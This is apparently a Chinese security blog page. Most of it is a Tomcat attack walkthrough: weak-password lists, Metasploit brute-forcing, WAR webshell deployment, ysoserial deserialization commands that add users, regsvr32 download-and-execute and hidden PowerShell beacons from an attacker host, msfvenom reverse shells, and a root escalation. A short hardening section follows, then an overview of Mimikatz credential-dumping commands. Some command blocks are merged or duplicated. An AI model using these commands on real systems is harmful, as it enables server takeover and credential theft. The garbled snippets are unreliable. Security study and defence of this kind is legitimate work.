<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net:&quot;40.112.0.0/16&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;	对某些大目标来讲,可先尝试获取它的 as 号,然后再根据 as 号查到的网段,批量抓 tomcat 入口</span><br></pre></td></tr></table></figure>
<h3 id="2-低版本-tomcat-管理控制台的弱口令爆破"><a href="#2-低版本-tomcat-管理控制台的弱口令爆破" class="headerlink" title="2.    低版本 tomcat 管理控制台的弱口令爆破"></a>2.    低版本 tomcat 管理控制台的弱口令爆破</h3><p> 此处暂以 tomcat 6.0.9 为例进行演示 </p>
<p>注意,此处所说的低版本 tomcat,通常是指 7.x 以下的版本,不包括 7.x,因为在 7.x 之后的版本中开始加入了防爆机制,会自动锁定正在爆破的用户,所以如果你在实战中看到 tomcat 7.x 以后的版本,基本都不用再尝试爆破了,也几乎不太可能爆出来,ok,说完利用前提,我们就来实际的干,首先,去添加好 tomcat 控制台角色用户,到 C:\apache-tomcat-6.0.9\conf\tomcat-users.xml 文件的<tomcat-users>标签内添加如下用户,注意,6.x 的角色名称可能不大一样,在角色后面没有-gui,7.x 版本之后的才有,配置完之后,运行 C:\apache-tomcat-6.0.9\bin\startup.bat 脚本即可启动 tomcat 服务</tomcat-users></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">role rolename="manager"/&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">roles</span>=<span class="string">"manager,admin"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>爆破 msf 中的 tomcat_mgr_login 模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">msf &gt; set rhosts 192.168.3.188 msf &gt; set rport 8080</span><br><span class="line">msf &gt; set targeturi /manager/html msf &gt; set username tomcat</span><br><span class="line">msf &gt; set pass_file /root/wordlist/passwd.txt</span><br><span class="line">msf &gt; set stop_on_success true msf &gt; set bruteforce_speed 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
<p>常见的 Tomcat 管理控制台弱口令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">admin:password</span><br><span class="line">admin:Password1 </span><br><span class="line">admin:password1</span><br><span class="line">admin:admin</span><br><span class="line">admin:123456 </span><br><span class="line">admin:a123456</span><br><span class="line">admin:12345678</span><br><span class="line">admin:j5Brn9 </span><br><span class="line">admin:tomcat</span><br><span class="line">tomcat:tomcat </span><br><span class="line">tomcat:s3cret </span><br><span class="line">tomcat:password1 </span><br><span class="line">tomcat:password</span><br><span class="line">tomcat:admin</span><br><span class="line">tomcat:changethis</span><br><span class="line">both:tomcat </span><br><span class="line">manager:manager </span><br><span class="line">role1:role1 </span><br><span class="line">role1:tomcat </span><br><span class="line">role:changethis </span><br><span class="line">root:Password1</span><br><span class="line">root:changethis </span><br><span class="line">root:password </span><br><span class="line">root:password1</span><br><span class="line">root:r00t </span><br><span class="line">root:toor </span><br><span class="line">root:root</span><br><span class="line">admin:</span><br><span class="line">tomcat:</span><br></pre></td></tr></table></figure>
<h3 id="3-war包部署webshell"><a href="#3-war包部署webshell" class="headerlink" title="3.    war包部署webshell"></a>3.    war包部署webshell</h3><p>​    在 tomcat 的 manager 中控制台自带的自动 war 包部署功能来部署我们的 webshell</p>
<p>把当前目录下的xiaoma.jsp文件打包成xiaoma.war</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfM0 xiaoma.war xiaoma.jsp</span><br><span class="line"></span><br><span class="line">-c 创建war包</span><br><span class="line">-v 显示过程信息</span><br><span class="line">-f</span><br><span class="line">-M</span><br><span class="line">-0 这个是阿拉伯数字，只打包不压缩的意思</span><br></pre></td></tr></table></figure>
<p>防御：</p>
<ul>
<li>直接删掉 manager 目录</li>
<li>加强web口令</li>
<li>安全设备</li>
</ul>
<p>[Java类WebServer及中间件拿webshell方法总结]</p>
<p>具体参见：<a href="https://www.cnblogs.com/shellr00t/p/5965727.html" target="_blank" rel="noopener">https://www.cnblogs.com/shellr00t/p/5965727.html</a></p>
<h3 id="4-Tomacat-远程代码执行-CVE-2016-8735"><a href="#4-Tomacat-远程代码执行-CVE-2016-8735" class="headerlink" title="4.    Tomacat 远程代码执行[CVE-2016-8735 ]"></a>4.    Tomacat 远程代码执行[CVE-2016-8735 ]</h3><p>mark：<a href="http://www.freebuf.com/news/121868.html" target="_blank" rel="noopener">http://www.freebuf.com/news/121868.html</a></p>
<h4 id="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"><a href="#前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的" class="headerlink" title="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"></a><strong>前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的</strong></h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><blockquote>
<p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11</p>
<p>Apache Tomcat 8.5.0 to 8.5.6</p>
<p>Apache Tomcat 8.0.0.RC1 to 8.0.38</p>
<p>Apache Tomcat 7.0.0 to 7.0.72</p>
<p>Apache Tomcat 6.0.0 to 6.0.47</p>
</blockquote>
<p>在 Tomcat 中默认会使用 JmxRemoteLifecycleListener 这个监听器来监控 tomcat 平时的各种运行状态,但 Oracle 在修复了 JmxRemoteLifecycleListener 反序列化漏洞[CVE-2016-3427] 之后,却忘记了及时对 Tomcat<br>中的 jmx 监听器进行升级,这才导致了该漏洞的产生,所以,它本质还是 jmx 的漏洞并非 tomcat 自身漏洞,实际上 JmxRemoteLifecycleListener 平时用来做监控居多,没错,实战中直接从外部碰到该端口的机会也并不是特别多。</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>首先,依然是先准备好基础环境,配置 JmxRemoteLifecycleListener 监听器,注意,如果你发现自己 tomcat 的lib 目录中没有 catalina-jmx-remote.jar 这个包,请自行到官方站点下载好放进去,不然可能会出报错,不过一般默认都会有,而后编辑 C:\apache-tomcat-8.0.36\conf\server.xml 添加如下的监听器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>端口可随意,只要不冲突即可</p>
<p>之后,再去编辑 C:\apache-tomcat-8.0.36\bin\catalina.bat 文件,添加如下变量,直接在 setlocal 下面开始添加,语句的主要作用是方便别人远程连过来对此 jvm 进行监控,注意,此处是没有启用用户认证</p>
<p>最后,执行 C:\apache-tomcat-8.0.36\bin\startup.bat 脚本,启动 tomcat,看到 rmi 的端口全部正常起来以后,说明环境基本就没啥问题了</p>
<p><strong>扫描：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sT -sV -p 1-50000 --open -Pn -v  [目标ip]</span><br></pre></td></tr></table></figure>
<p><strong>反序列化 payload：</strong> </p>
<p>ysoserial java 反序列化 payload 工具去执行系统命令:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit [目标ip] 1000 1 Groovy1 "cmd.exe /c net user flag "Admin!@#45" /add"</span><br></pre></td></tr></table></figure>
<p><strong>msf ：</strong></p>
<p>很显然,在实战中,如果直接像上面这样执行系统命令利用起来肯定不够直接,我们现在不妨尝试直接配合 msf 一起利用,来尝试弹回一个 meterpreter 的 shell,具体过程如下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 &gt; set target 3  			# regsvr32 来远程下载执行</span><br><span class="line">msf5 &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf5 &gt; set lhost [本地ip]</span><br><span class="line">msf5 &gt; set lport 53</span><br><span class="line">msf5 &gt; set rc4password klionsec msf5 &gt; exploit -j</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">唯一需要注意的是,由于执行过程中需要远程下载 payload,所以这就要求当前目标机器必须能正常通外网才行,不然 payload 都下不了,meterpreter 自然也就弹不回来了</span><br><span class="line"></span><br><span class="line"># java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.188 10001 Groovy1 &quot;cmd.exe /c regsvr32 /s /n /u /i:http://192 .168.3.7:8080/CzVtq564v1ymsYr.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
<p><strong>powershell 回弹beacon：</strong></p>
<p>如果你觉得 meterpreter 还不够直接,没问题,直接尝试利用 powershell 尝试弹个 beacon 的 shell 也是可以的,实际利用过程如下,先生成 ps 的 payload</p>
<p>而后,继续通过 ysoserial.jar 发送执行该 payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar	ysoserial.exploit.RMIRegistryExploit [目标ip] 10001 Groovy1 " cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encode"</span><br></pre></td></tr></table></figure>
<h3 id="5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615"><a href="#5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615" class="headerlink" title="5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]"></a>5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]</h3><p>mark:    <a href="https://paper.seebug.org/398/" target="_blank" rel="noopener">https://paper.seebug.org/398/</a></p>
<h4 id="前提是启动PUT方法、默认关闭。"><a href="#前提是启动PUT方法、默认关闭。" class="headerlink" title="前提是启动PUT方法、默认关闭。"></a>前提是启动PUT方法、默认关闭。</h4><p>​     在配置文件conf/web.xml 文件。默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控。</p>
<p><strong>用 msf 生成 jsp webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=[目标IP] LPORT=80 -f raw -o rev.jsp</span><br></pre></td></tr></table></figure>
<p>通过 curl 把我们上面的 webshell 用重定向的方式直接 put 到目标机器的 web 根目录下,需要注意的是,默认 Tomcat 的 Servlet 是在 conf/web.xml 中配置的,当后缀名为 .jsp 和 .jspx 的时候,就会丢给JspServlet 处理,所以,我们需要对后缀做些特殊的处理,比如,在 url 最后加个 / . 或者 %20</p>
<p>继续通过 curl 访问执行该 webshell,即可看到目标机器的 cmd shell 被成功弹回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://[目标IP]:8080/Readmes.jsp</span><br></pre></td></tr></table></figure></p>
<h3 id="7-Tomcat-本地提权漏洞利用-CVE-2016-1240"><a href="#7-Tomcat-本地提权漏洞利用-CVE-2016-1240" class="headerlink" title="7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]"></a>7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]</h3><p>mark：<a href="http://www.freebuf.com/vuls/115862.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/115862.html</a></p>
<blockquote>
<p>Tomcat 8 &lt;= 8.0.36-2</p>
<p>Tomcat 7 &lt;= 7.0.70-2</p>
<p>Tomcat 6 &lt;= 6.0.45 + dfsg-1~deb8u1</p>
<p>受影响的系统包括的Debian，Ubuntu的，其他使用相应的deb包的系统也可能受到影响。</p>
</blockquote>
<h4 id="前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级"><a href="#前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级" class="headerlink" title="前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],"></a>前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],</h4><p>简单回顾:</p>
<p><strong>原理：劫持服务端配置文件</strong></p>
<p>核心就在于 Tomcat 服务在启动时 [关键代码如下] 会将 log 文件 catalina.out 的所有者改为 Tomcat 用户[降权行为],而启动脚本通常却是以 root 权限在执行,那么借助此特性,我们可以通过用创建软链接的方式,在<br>root 重启 tomcat 服务时将任意文件的属主改为 Tomcat 账户,以达到降权访问系统核心配置文件的目的,比如,你事先在 tomcat 权限下将 catalina.out 修改为指向那些原本需要高权限才能访问到的关键性系统文件的软链接,此后 root 重启 tomat 便可以随意访问该系统配置文件,说到底这其实还是一种非常典型的配置文件加载劫持手法,更深入的就不说了,主要还是看在实战中如何利用,漏洞关键代码如下,就那一句</p>
<p>默认网站目录位置:<br>/var/lib/tomcat7/webapps/ROOT</p>
<p>添加控制台角色用户,等会儿部署 webshell 要用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/tomcat7/tomcat-users.xml</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager -gui,admin-gui&quot;/&gt;</span><br><span class="line"># /etc/init.d/tomcat7 restart	重启 tomcat 服务</span><br></pre></td></tr></table></figure>
<p>下面,我们来着重看看具体利用过程,先尝试通过部署 war 包弹回一个低权限的 meterpreter 的 shell</p>
<p>用 msf 快速生成一个 war 包 webshell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
<p>再通过默认 manager 管理控制台把自己 war 包 webshell 部署到目标机器上去</p>
<p>接着,本地启动 msf 执行监听,访问我们刚刚部署好的 war 包 webshell 的 url <a href="http://192.168.3.153:8080/options,随后便可看到" target="_blank" rel="noopener">http://192.168.3.153:8080/options,随后便可看到</a> meterpreter 被正常弹回,注意,此时弹回的权限仍然比较低,只是个 tomcat 服务用户权限</p>
<p>而后,开始今天的重点,首先,找到 catalina.out 文件所在的路径,默认会在/var/log/tomcat7 目录下,实战中如果实在找不到,不妨直接 find 下,而后上传 exp 脚本并赋予执行权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
<p>跟上 catalina.out 日志文件所在路径,开始执行 exp 脚本,此时只待目标重启 tomcat 服务,我们便可获取一个 root 权限的 shell,其实,是因为在 tmp 目录下下会生成一个带有 suid 权限的 tomcatrootsh 文件</p>
<p>Ok,此处我们就自己用 root 到目标机器上重启下 tomcat 服务,看看实际提权效果,实战中,完全可以不用等,想办法直接把 tomcat 进程干掉,逼着管理员过来重启 tomcat 就行</p>
<p>当目标管理员重启 tomcat 服务后,我们便立即有了一个 root 权限的 shell。</p>
<h3 id="6-Tomcat安全绕过漏洞-CVE-2018-1305"><a href="#6-Tomcat安全绕过漏洞-CVE-2018-1305" class="headerlink" title="6.    Tomcat安全绕过漏洞[CVE-2018-1305]"></a>6.    Tomcat安全绕过漏洞[CVE-2018-1305]</h3><p>mark:    <a href="http://www.nsfocus.com.cn/content/details_141_2703.html" target="_blank" rel="noopener">http://www.nsfocus.com.cn/content/details_141_2703.html</a></p>
<p><a href="https://xz.aliyun.com/t/2088" target="_blank" rel="noopener">https://xz.aliyun.com/t/2088</a></p>
<p>受影响版本</p>
<blockquote>
<p>Apache Tomcat &lt; 9.0.5<br>Apache Tomcat &lt; 8.5.28<br>Apache Tomcat &lt; 8.0.50<br>Apache Tomcat &lt; 7.0.85</p>
</blockquote>
<blockquote>
<p>条件：</p>
<p>业务系统部署在低版本的Tomcat中。<br>业务系统通过注解的方式定义安全约束。</p>
</blockquote>
<p>漏洞危害较高，但是利用条件困难，因此影响范围并不大。</p>
<h2 id="0x02-Tomcat服务安全加固"><a href="#0x02-Tomcat服务安全加固" class="headerlink" title="0x02 Tomcat服务安全加固"></a>0x02 Tomcat服务安全加固</h2><p>Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。由于运维人员的疏忽，可能导致管理后台存在空口令或者弱口令的漏洞，使得黑客或者不法分子可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷。</p>
<p>通常 Tomcat 后台管理的 URL 地址为 <a href="http://ip:8080/manager/html/" target="_blank" rel="noopener">http://iP:8080/manager/html/</a>,</p>
<p>黑客通过猜解到的口令登录 Tomcat 管理后台后，可以上传 Webshell 脚本导致服务器被入侵。</p>
<h3 id="安全加固方案"><a href="#安全加固方案" class="headerlink" title="安全加固方案"></a>安全加固方案</h3><p>由于此类型漏洞可能对业务系统造成比较严重的危害，建议针对 Tomcat 管理后台进行以下安全加固配置。</p>
<h4 id="1-网络访问控制"><a href="#1-网络访问控制" class="headerlink" title="1. 网络访问控制"></a>1. 网络访问控制</h4><ul>
<li>如果的业务不需要使用 Tomcat 管理后台管理业务代码，建议使用<a href="https://help.aliyun.com/document_detail/25475.html" target="_blank" rel="noopener">安全组防火墙</a>功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码。</li>
<li>如果的业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合。</li>
</ul>
<h4 id="2-开启-Tomcat-的访问日志"><a href="#2-开启-Tomcat-的访问日志" class="headerlink" title="2. 开启 Tomcat 的访问日志"></a>2. 开启 Tomcat 的访问日志</h4><p>修改 conf/server.xml 文件，将下列代码取消注释：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="attr">directory</span>=<span class="string">"logs"</span>   <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span> <span class="attr">pattern</span>=<span class="string">"common"</span> <span class="attr">resolveHosts</span>=<span class="string">"false"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home/logs 文件夹中就可以看到访问日志。</p>
<h4 id="3-Tomcat-默认帐号安全"><a href="#3-Tomcat-默认帐号安全" class="headerlink" title="3.Tomcat 默认帐号安全"></a>3.Tomcat 默认帐号安全</h4><p>修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效。</p>
<h4 id="4-修改默认访问端口"><a href="#4-修改默认访问端口" class="headerlink" title="4.修改默认访问端口"></a>4.修改默认访问端口</h4><p>修改 conf/server.xml 文件把默认的 8080 访问端口改成其它端口。</p>
<h4 id="5-重定向错误页面"><a href="#5-重定向错误页面" class="headerlink" title="5. 重定向错误页面"></a>5. 重定向错误页面</h4><p>修改访问 Tomcat 错误页面的返回信息，在 webapps\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf/web.xml 文件的最后一行之前添加下列代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span>      </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>401<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>              </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/401.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>        </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>  </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>  </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>      </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="6-禁止列出目录"><a href="#6-禁止列出目录" class="headerlink" title="6. 禁止列出目录"></a>6. 禁止列出目录</h4><p>防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况。</p>
<p>在 web.xml 文件中，将<code>&lt;param-name&gt;listings&lt;/param-name&gt;</code>改成<code>&lt;param-name&gt;false&lt;/param-name&gt;</code>。</p>
<h4 id="7-删除文档和示例程序"><a href="#7-删除文档和示例程序" class="headerlink" title="7. 删除文档和示例程序"></a>7. 删除文档和示例程序</h4><p>删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web应用安全/">Web应用安全</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Mimikatz"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/01/13/Mimikatz/">Mimikatz</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/01/13/Mimikatz/" class="article-date">
	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul>
<li>cls—————————–清屏</li>
<li>exit—————————-退出</li>
<li>version————查看mimikatz的版本</li>
<li>system::user—–查看当前登录的系统用户</li>
<li>system::computer——-查看计算机名称</li>
<li>process::list——————列出进程</li>
<li>process::suspend 进程名称 —–暂停进程</li>
<li>process::stop 进程名称———结束进程</li>
<li>process::modules –列出系统的核心模块及所在位置</li>
<li>service::list—————列出系统的服务</li>
<li>service::remove———–移除系统的服务</li>
<li>service::start stop 服务名称–启动或停止服务</li>
<li>privilege::list—————列出权限列表</li>
<li>privilege::enable——–激活一个或多个权限</li>
<li>privilege::debug—————–提升权限</li>
<li>nogpo::cmd————打开系统的cmd.exe</li>
<li>nogpo::regedit ———–打开系统的注册表</li>
<li>nogpo::taskmgr————-打开任务管理器</li>
<li>ts::sessions—————–显示当前的会话</li>
<li>ts::processes——显示进程和对应的pid情况等</li>
<li>sekurlsa::wdigest—–获取本地用户信息及密码</li>
<li>sekurlsa::tspkg——获取tspkg用户信息及密码</li>
<li>sekurlsa::logonPasswords–获登陆用户信息及密码</li>
</ul>
<p><strong>翻译来自</strong>：<a href="https://adsecurity.org/?page_id=1821" target="_blank" rel="noopener">https://adsecurity.org/?page_id=1821</a></p>
<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-LoadScreen-211-2017-11-28.png" alt="img"></h5><h3 id="Mimikatz概述："><a href="#Mimikatz概述：" class="headerlink" title="Mimikatz概述："></a><strong>Mimikatz概述：</strong></h3><p>Mimikatz是从Windows系统收集凭据数据的最佳工具之一。事实上，我认为Mimikatz是Windows凭证的“瑞士军刀”（或多工具） - 这是一个可以做任何事情的工具。由于Mimikatz，Benjamin Delpy的作者是法语，大多数描述Mimikatz使用的资源都是法语，至少在<a href="http://blog.gentilkiwi.com/" target="_blank" rel="noopener">他的博客上</a>。该<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz GitHub的库</a>是英文的，包括命令使用的有用信息。</p>
<p><strong>Mimikatz</strong>是一个Windows x32 / x64程序，由Benjamin Delpy（@gentilkiwi）于2007年编写，用于了解有关Windows凭据（以及作为概念证明）的更多信息。有两个可选组件提供附加功能，<em>mimidrv</em>（与Windows内核交互的驱动程序）和<em>mimilib</em>（AppLocker旁路，Auth软件包/ SSP，密码过滤器和WinDBG的sekurlsa）。Mimikatz需要管理员或SYSTEM并经常debug权限以执行某些操作并与LSASS进程交互（取决于所请求的操作）。Mimikatz.exe包含或至少应包含其中指出的所有功能。</p>
<p>Mimikatz功能可以通过<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">编译和运行您自己的版本</a>，运行<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz可执行文件</a>，利用<a href="https://www.offensive-security.com/metasploit-unleashed/mimikatz/" target="_blank" rel="noopener">MetaSploit脚本</a>，<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">官方Invoke-Mimikatz PowerShell版本</a>或十几种Mimikatz PowerShell变体（我碰巧偏向<a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">PowerShell Empire</a>，因为帝国很棒！）。</p>
<p>Mimikatz源代码和发布二进制文件可在GitHub上获得，并在Creative Commons下获得许可，具有以下细节：<br><em>您可以自由地：</em><br><strong>共享 - 以任何媒体或格式复制和重新分发材料*</strong></p>
<p>适应 - 重新混合，转换和构建材料<em><br>**用于任何目的，甚至商业用途。</em><br><em>只要您遵守许可条款，许可人就不能撤销这些自由。</em><br><em>归因 - 您必须提供适当的信用，提供许可证的链接，并指出是否进行了更改。您可以以任何合理的方式这样做，但不得以任何方式表明许可人认可您或您的使用。</em><br><em>没有其他限制 - 您可能不会使用法律条款或技术措施来合法地限制他人做许可证所允许的任何事情。</em></p>
